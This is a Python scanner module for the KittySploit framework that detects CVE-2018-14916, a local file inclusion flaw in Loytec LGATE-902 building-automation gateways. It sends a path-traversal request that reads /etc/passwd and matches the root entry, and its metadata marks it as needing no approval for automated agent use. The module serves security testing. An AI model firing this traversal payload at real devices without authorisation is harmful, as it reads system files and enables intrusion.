#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Loytec LGATE-902 versions prior to 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Loytec LGATE-902 <6.4.2 - Local File Inclusion Detection',
        'description': 'Loytec LGATE-902 versions prior to 6.4.2 suffers from a local file inclusion vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'loytec', 'lfi', 'packetstorm', 'seclists', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/152453/Loytec-LGATE-902-XSS-Traversal-File-Deletion.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-14916',
            'http://packetstormsecurity.com/files/152453/Loytec-LGATE-902-XSS-Traversal-File-Deletion.html',
            'https://seclists.org/fulldisclosure/2019/Apr/12',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-14916',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Loytec LGATE-902 <6.4.2 - Local File Inclusion detected",
                path='/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152',
            )
            return True
        return False

